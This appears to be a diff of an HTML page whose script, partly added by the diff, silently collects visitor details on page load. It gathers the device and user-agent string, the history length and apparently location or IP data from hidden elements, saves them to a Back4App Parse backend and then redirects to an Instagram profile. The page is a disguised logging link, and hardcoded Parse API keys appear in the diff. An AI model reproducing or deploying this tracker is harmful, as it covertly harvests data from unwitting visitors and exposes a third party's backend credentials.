@@ -21,6 +21,7 @@
 
   </head>
   <body>
+	
 	<h3></h3>
   </body>
 
@@ -32,16 +33,13 @@
   <h1 id="RG" style="background:red; height:100px;visibility:hidden"></h1>
 
   <h1 id="IP" style="background:red; height:100px;visibility:hidden"></h1>
-  <!--
-  <h1 id="LT" style="background:red; height:100px;">b1f520b70c5e1def4723864208d31227d64a523ba902d54f49656753</h1>
-
-  <h1 id="LG" style="background:red; height:100px;"></h1>
-  -->
+  
   <h1 id="LL" style="background:red; height:100px;visibility:hidden"></h1>
 
   <h1 id="LL2" style="background:red; height:100px;visibility:hidden"></h1>
 
   <textarea id="informação" style="background:red; height:100px;visibility:hidden"></textarea>
+
 
   <h1 id="informação_total" style="visibility:hidden"></h1>
 
@@ -50,7 +48,45 @@
   <pre id="response"></pre>
 
 <script>
- var INFO;
+  
+ //Parse
+ Parse.initialize("x7muRI33edgJhoi2lA1pkBbt1KRBm3CoyWVn6Vi2", "bOW2f0AgnDXdvi4FOmzUscvLKRdIaaEhGmdrF1PI"); //PASTE HERE YOUR Back4App APPLICATION ID AND YOUR Javascript KEY
+ Parse.serverURL = "https://parseapi.back4app.com/";
+ 
+var count = 0;
+
+const GameScore = Parse.Object.extend("GabrielCount");
+
+const query = new Parse.Query(GameScore);
+
+query.get("AjY7A9VuV1")
+.then((gameScore) => {
+  // The object was retrieved successfully.
+  const score = gameScore.get("Count");
+  count = score;
+  count++;
+  gameScore.save().then((gameScore) => {
+  gameScore.set("Count", count);
+  return gameScore.save();
+});
+
+f(count);
+
+if(count<=20){
+  
+  }else{
+  
+  }
+  
+  
+  
+}, (error) => {
+
+});
+function f(i){
+if(i<=101){
+//alert("msg"+i);
+  var INFO;
   IS_MOBILE = (function (a) {
   INFO = a;
   document.getElementById('informação').value=a;
@@ -123,13 +159,8 @@ string2 = "-"+i2;
  "INFORMACOES DO APARELHO:"+INFO+"\n"+
  "INFORMACAO DAS QUATIDADE DEPAGINAS ABERTAS NA MESMA ABA:"+window.history.length;
 
-
- //Parse
-      Parse.initialize("q3CTgQtrAOL8hHPvpPN2HzWUVSozLqEo7rJt9Cu9", "lDUd1soV2kESsDCI6l9tUYqo4IURVKFg6Rd3eyc7"); //PASTE HERE YOUR Back4App APPLICATION ID AND YOUR Javascript KEY
-      Parse.serverURL = "https://parseapi.back4app.com/";
+ var Gps = Parse.Object.extend("Gabriel");
 	  
-	  var Gps = Parse.Object.extend("Gps");
-	
 	  create();
 	  
 	  function create(){
@@ -142,12 +173,18 @@ string2 = "-"+i2;
 	  mygps.set("informacao",document.getElementById('informação').value);
 	  mygps.set("todas_informacoes",Total);
 	  mygps.save();
-	  var intervalo = setInterval(function(){
-	  window.location.href="https://www.instagram.com/gabrielgomes901";
-	  clearInterval(intervalo);
-	  },0);
+	  
+ setTimeout(function(){
+ window.location.href="https://www.instagram.com/gabrielgomes901";
+ clearTimeout();
+ },2000);
+ 
 	  }
-}, "json");
+	 }, "json");
+	 }else{
+	 window.location.href="https://www.instagram.com/gabrielgomes901";
+	 }
+}
 
 </script>
 </html>		
